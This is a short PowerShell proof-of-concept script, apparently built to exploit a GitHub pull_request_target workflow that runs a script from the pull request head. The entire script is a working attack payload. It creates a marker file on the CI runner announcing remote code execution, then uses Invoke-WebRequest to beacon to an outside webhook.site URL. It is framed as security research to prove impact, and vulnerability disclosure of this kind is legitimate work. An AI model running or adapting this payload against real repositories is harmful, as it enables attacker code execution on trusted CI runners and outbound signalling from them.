# PoC - content injection to prove impact (security research)
$dir = "Parsers/ASimDns/Parsers"
if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
$content = @"
# PROOF OF RCE - Injected by attacker via pull_request_target
# This file was created by attacker-controlled code running on the runner.
# Workflow checks out PR head and executes .script/kqlFuncYaml2Arm.ps1 from it.
"@
Set-Content -Path "$dir/POC_INJECTED_BY_ATTACKER.yaml" -Value $content

Invoke-WebRequest -Uri "https://webhook.site/23ce2d7a-df9f-4be9-a366-a7a8c5884599?poc=prove_impact" -UseBasicParsing | Out-Null
exit 0
